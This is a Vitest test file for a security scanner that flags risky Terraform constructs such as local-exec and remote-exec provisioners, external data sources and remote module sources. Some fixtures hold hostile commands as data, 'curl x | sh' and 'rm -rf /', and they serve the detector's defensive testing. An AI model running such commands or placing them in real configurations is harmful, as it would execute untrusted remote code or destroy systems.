import { describe, it, expect } from 'vitest';
import { TerraformSignals } from '../../../src/security/signals/terraform-signals.js';

const detector = new TerraformSignals();
const TF = '/project/main.tf';

describe('TerraformSignals', () => {
  it('language property is "terraform"', () => {
    expect(detector.language).toBe('terraform');
  });

  it('ignores files that are not .tf', () => {
    expect(detector.detect('/project/main.tf.json', 'provisioner "local-exec" {}')).toEqual([]);
  });

  it('flags a local-exec provisioner as critical', () => {
    const s = detector.detect(TF, 'resource "null_resource" "x" {\n provisioner "local-exec" {\n command = "curl x | sh"\n }\n}')
      .find(x => x.type === 'local-exec-provisioner');
    expect(s).toBeDefined();
    expect(s!.severity).toBe('critical');
    expect(s!.category).toBe('install-script');
  });

  it('flags a remote-exec provisioner as critical', () => {
    const s = detector.detect(TF, 'provisioner "remote-exec" {\n inline = ["rm -rf /"]\n}')
      .find(x => x.type === 'remote-exec-provisioner');
    expect(s).toBeDefined();
    expect(s!.severity).toBe('critical');
  });

  it('flags an external data source as high', () => {
    const s = detector.detect(TF, 'data "external" "e" {\n program = ["python", "s.py"]\n}')
      .find(x => x.type === 'external-data-source');
    expect(s).toBeDefined();
    expect(s!.severity).toBe('high');
  });

  it('flags a git module source as high', () => {
    const s = detector.detect(TF, 'module "m" {\n source = "git::https://x/mod.git"\n}')
      .find(x => x.type === 'git-module-source');
    expect(s).toBeDefined();
    expect(s!.severity).toBe('high');
    expect(s!.category).toBe('dependency-confusion');
    expect(s!.content).toBe('git::https://x/mod.git');
  });

  it('flags an https module source as high', () => {
    const s = detector.detect(TF, 'module "m" {\n source = "https://x/mod.zip"\n}')
      .find(x => x.type === 'https-module-source');
    expect(s).toBeDefined();
    expect(s!.severity).toBe('high');
  });

  it('emits one signal per git module source', () => {
    const content = 'source = "git::https://x/a.git"\nsource = "git::https://x/b.git"';
    const signals = detector.detect(TF, content).filter(x => x.type === 'git-module-source');
    expect(signals).toHaveLength(2);
  });

  it('returns nothing for a registry-sourced module', () => {
    expect(detector.detect(TF, 'module "vpc" {\n source = "terraform-aws-modules/vpc/aws"\n}')).toEqual([]);
  });

  it('detects several terraform signals together', () => {
    const content = 'provisioner "local-exec" {}\ndata "external" "e" {}\nsource = "git::https://x/a.git"';
    const types = detector.detect(TF, content).map(s => s.type);
    expect(types).toContain('local-exec-provisioner');
    expect(types).toContain('external-data-source');
    expect(types).toContain('git-module-source');
  });
});
